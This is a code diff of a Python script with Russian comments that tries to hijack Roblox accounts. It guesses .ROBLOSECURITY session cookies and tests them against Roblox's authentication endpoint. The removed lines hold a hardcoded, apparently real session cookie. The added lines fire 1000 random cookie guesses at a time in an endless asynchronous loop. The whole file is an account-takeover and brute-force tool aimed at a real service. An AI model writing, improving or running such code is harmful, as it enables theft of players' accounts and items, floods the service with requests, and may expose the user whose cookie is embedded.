@@ -1,12 +1,38 @@
-from requests import get
-import time
+import asyncio
+import aiohttp
 import random
-while True:
-  valid_letters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890'
-  rancookie = ''.join((random.choice(valid_letters) for i in range(1356)))
-  finalcookie = "_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_" + rancookie
-  response = get('https://users.roblox.com/v1/users/authenticated',cookies={'.ROBLOSECURITY': "_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_2F7A5DF80E792D8DD53E7984BFD20DC5895A9235CED4199FC1E451B586F11C8F2A120672048904793D798892D55EBB376F8322EF460FCC84C633A96B4E5D2426F8615E539B1B2B9DBE47A1324A8EF27AA2EFD159B657A2F5B18D5CAE1D6681397571AA5FB81A8778601A2C7C38630111E015F56311EA34A570AE1361132E9AE5852253F9C34C0CA0B4528314197AD43B51187FE4AB607628AA571D20AFDDC60E4002D2E0206789D274032D0D67CDB467D6673DB7DEC721D85A37E7B65A6A384D27F5D20681B404C362E3AA4BAA6F8942855E8F7414823ABD034ECA0B0CA26A6E09C2C1AF012E967CECC7B765C407371396BF64A404CE7CF11779FE42333BB780A740B1FADB6E136F9AC8870BB3131D9C4ACBC3808AA35EA364358BC66CBB8E2DFC1FD0F4EB53CD7899A33164520508D5BBECD01A83C1818765D0048BEF1854C366F9FE77CF6DDC0377E9B25BEB3F8529372EC6FF613CB80225A26428F888D8979BA7F49AF9D2F908F059B202B8392274E0E93F71"})
-  if "Unauthorized" in response.text:
-    print("invalid")
-  else:
-    print("valid")
+
+# Функция для генерации случайного кука
+def generate_cookie():
+    valid_letters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890'
+    rancookie = ''.join((random.choice(valid_letters) for _ in range(1356)))
+    return "_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_" + rancookie
+
+# Асинхронная функция для проверки одного кука
+async def check_cookie(session, cookie):
+    url = 'https://users.roblox.com/v1/users/authenticated'
+    cookies = {'.ROBLOSECURITY': cookie}
+    
+    async with session.get(url, cookies=cookies) as response:
+        if "Unauthorized" in await response.text():
+            print("Неверный")
+        else:
+            print("Верный")
+
+# Асинхронная функция для проверки нескольких куков одновременно
+async def check_cookies_concurrently(n):
+    async with aiohttp.ClientSession() as session:
+        tasks = []
+        for _ in range(n):
+            cookie = generate_cookie()
+            tasks.append(check_cookie(session, cookie))
+        await asyncio.gather(*tasks)
+
+# Главная функция для запуска асинхронных задач
+async def main():
+    while True:
+        await check_cookies_concurrently(1000)  # Проверяем 1000 куков одновременно
+
+# Точка входа в скрипт
+if __name__ == "__main__":
+    asyncio.run(main())
